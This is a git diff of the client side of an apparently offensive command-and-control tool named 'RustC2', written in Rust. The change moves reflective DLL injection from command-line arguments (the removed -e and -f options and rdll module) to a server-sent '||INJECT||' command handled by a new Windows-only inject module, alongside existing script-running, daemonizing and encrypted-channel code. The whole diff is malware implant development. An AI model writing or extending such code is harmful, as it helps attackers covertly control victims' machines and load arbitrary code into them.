@@ -12,7 +12,7 @@ use x25519_dalek::{EphemeralSecret, PublicKey, SharedSecret};
 use rand::rngs::OsRng;
 mod utils;
 mod sandbox;
-mod rdll;
+mod inject;
 
 use utils::ImportedScript;
 
@@ -39,8 +39,6 @@ fn main() {
 
     let mut host = "127.0.0.1".to_string();
     let mut port = "8080".to_string();
-    let mut injected = String::from("");
-    let mut export = String::from("");
     let mut imported_scripts: HashMap<String, ImportedScript> = HashMap::new();
 
     let matches = Command::new("RustC2")
@@ -49,8 +47,6 @@ fn main() {
         .arg(arg!(-H --host [IpAddr] "The host ip of the server (default 127.0.0.1)"))
         .arg(arg!(-p --port [PORT] "The port number used by the server (default 8080)"))
         .arg(arg!(-d --daemonize "Daemonize the client"))
-        .arg(arg!(-e --pe [ExeDLL] "The Exe or dll to inject"))
-        .arg(arg!(-f --ex [Func] "Insert export function DLL"))
         .get_matches();
 
     if let Some(h) = matches.get_one::<String>("host") {
@@ -63,14 +59,6 @@ fn main() {
     if matches.get_flag("daemonize") {
         #[cfg(unix)]
         daemonize_process();
-    }
-
-    if let Some(pe) = matches.get_one::<String>("pe") {
-        injected = pe.to_string();
-    }
-
-    if let Some(ex) = matches.get_one::<String>("ex") {
-        export = ex.to_string();
     }
 
     let username = std::env::var("USERNAME").expect("username variable not set");
@@ -133,9 +121,10 @@ fn main() {
                         }
                     } else if command.starts_with("||RUNSCRIPT||") {
                         utils::handle_run_script(&mut stream, &command, &imported_scripts, shared_secret);
-                    } else if command.starts_with("||RDLL||") 
+                    } else if command.starts_with("||INJECT||") 
                     {
-                        rdll::reflective_inject(&mut stream, injected.clone(), export.clone(), shared_secret);
+                        #[cfg(windows)]
+                        inject::reflective_inject(&mut stream, command, shared_secret);
                     } else if command_clone.starts_with("||EXIT||") {
                         exit(1);
                     } else {
